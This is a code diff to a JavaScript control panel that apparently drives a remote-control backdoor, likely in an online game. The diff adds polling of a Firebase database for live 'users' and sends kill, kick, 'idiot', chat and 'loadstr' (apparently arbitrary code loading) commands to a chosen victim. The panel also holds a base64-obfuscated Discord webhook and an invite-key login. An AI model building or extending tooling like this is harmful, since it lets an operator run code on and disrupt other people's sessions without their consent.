@@ -3,6 +3,34 @@
     const mainPage = document.querySelector('.mainPage');
     let currentUser = null;
     let webhook = atob("aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTM4NjQ3OTI4NTE1MzU2MjcxNS9ZeVFabWlMcEo5NEY4ZlNrWi1Sc01oenVzN2sxOE5xWVY0NU1YVk9XTndMZmNXazdVbnl6eDV5UlVUSE1tcTM2SGZ4NA==");
+    function listActiveUsers() {
+  fetch('https://opbgguiserver-default-rtdb.firebaseio.com/main.json')
+    .then(res => res.json())
+    .then(data => {
+      const now = Date.now() / 1000;
+      const dropdown = document.getElementById("activeUsersDropdown");
+      dropdown.innerHTML = "";
+
+      for (const user in data) {
+        const ping = data[user]?.ping;
+        if (typeof ping === "number" && now - ping <= 5) {
+          const option = document.createElement("option");
+          option.value = user;
+          option.textContent = user;
+          dropdown.appendChild(option);
+        }
+      }
+
+      if (dropdown.options.length === 0) {
+        const option = document.createElement("option");
+        option.disabled = true;
+        option.textContent = "No active users";
+        dropdown.appendChild(option);
+      }
+    })
+    .catch(err => console.error("Error:", err));
+}
+
     document.getElementById("loginButton").addEventListener('click', () => {
         let inviteKey = document.getElementById("inviteKey").value;
         fetch(`https://opbgguipost.landyvilla3-99d.workers.dev/login?inviteKey=${inviteKey}`)
@@ -40,29 +68,31 @@
             });
         }
         document.getElementById("killButton").addEventListener('click', () => {
-            let user = document.getElementById("userInput").value;
+            let user = document.getElementById("activeUsersDropdown").value;
             let message = document.getElementById("messageInput").value;
             sendCommand(user, "kill", message);
         });
         document.getElementById("kickButton").addEventListener('click', () => {
-            let user = document.getElementById("userInput").value;
+            let user = document.getElementById("activeUsersDropdown").value;
             let message = document.getElementById("messageInput").value;
             sendCommand(user, "kick", message);
         });
         document.getElementById("idiotButton").addEventListener('click', () => {
-            let user = document.getElementById("userInput").value;
+            let user = document.getElementById("activeUsersDropdown").value;
             let message = document.getElementById("messageInput").value;
             sendCommand(user, "idiot", message);
         });
         document.getElementById("chatButton").addEventListener('click', () => {
-            let user = document.getElementById("userInput").value;
+            let user = document.getElementById("activeUsersDropdown").value;
             let message = document.getElementById("messageInput").value;
             sendCommand(user, "chat", message);
         });
         document.getElementById("ldstrButton").addEventListener('click', () => {
-            let user = document.getElementById("userInput").value;
+            let user = document.getElementById("activeUsersDropdown").value;
             let message = document.getElementById("messageInput").value;
             sendCommand(user, "loadstr", message);
         });
+        setInterval(listActiveUsers, 500);
     });
+    
 })();
